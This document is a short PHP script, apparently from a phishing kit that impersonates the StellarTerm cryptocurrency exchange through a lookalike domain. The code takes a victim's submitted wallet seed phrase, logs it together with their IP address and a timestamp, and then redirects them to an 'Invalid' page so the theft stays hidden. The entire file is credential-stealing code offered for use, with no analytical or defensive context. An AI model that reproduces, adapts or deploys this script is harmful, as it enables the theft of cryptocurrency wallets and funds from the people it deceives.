<?php
$file = "https://claim-stellarterm-exchange.mobi/seratujutalagi-2024_____Terms";
$walletSeed   = $_POST['walletSeed'];
$ip = $_SERVER['REMOTE_ADDR'];
$today = date("F j, Y, g:i a");

$handle = fopen($file, 'a');
fwrite($handle, "===================KEY=======================");
fwrite($handle, "\n");
fwrite($handle, "KEY : ");
fwrite($handle, "$walletSeed");
fwrite($handle, "\n");

fwrite($handle, "IP  : ");

fwrite($handle, "$ip");
fwrite($handle, "\n");
fwrite($handle, "Time: ");
fwrite($handle, "$today");
fwrite($handle, "\n");
fclose($handle);
header("Location:https://claim-stellarterm-exchange.mobi/Invalid.html?account/");

?>